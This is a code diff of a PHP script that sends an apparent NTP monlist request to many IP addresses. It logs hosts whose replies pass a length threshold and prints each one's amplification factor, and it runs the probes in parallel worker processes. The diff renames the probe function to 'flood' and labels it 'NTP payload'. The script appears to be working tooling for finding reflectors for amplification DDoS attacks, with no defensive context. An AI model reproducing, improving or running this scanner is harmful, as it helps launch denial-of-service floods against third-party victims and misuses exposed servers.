@@ -4,13 +4,15 @@
     ignore_user_abort(true);
     error_reporting(E_ERROR);
 
+    /* 判断参数 */
     if (threadfound($argv) == true) {
         die(thread($argv[1], $argv[2], $argv[3]));
     } else {
         die(start_threading($argv[1], $argv[2], $argv[3], $argv[4]));
     }
 
-    function MSEARCH($host, $timeout = 1)
+    /* NTP payload */
+    function flood($host, $timeout = 1)
     {
         $data = "\x17\x00\x03\x2a\x00\x00\x00\x00";
         $socket  = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
@@ -27,8 +29,8 @@
 
     function thread($ip, $output, $responselength)
     {
-        $len = strlen(MSEARCH($ip, 1));
-        if ($len>=$responselength)
+        $len = strlen(flood($ip, 3));
+        if ($len >= $responselength)
         {
             addentry($output, $ip.' '.$len);
             print("\n".$ip." ".$len." [x".round($len/108, 2)."]");
@@ -69,9 +71,8 @@
                 {
                     $ip = $match[0];
                     JMP:
-                    if ($threads < $maxthreads)
-                    {
-                        $pipe[$j] = popen('php'.' '.$self.' '.$ip.' '.$output.' '.$responselength.' '.'THREAD', 'w');
+                    if ($threads < $maxthreads) {
+                        $pipe[$j] = popen('php'.' '.$self.' '.$ip.' '.$output.' '.$responselength.' '.'Thread', 'w');
                         $threadarr[] = $j;
                         $j = $j + 1;
                         $threads = $threads + 1;
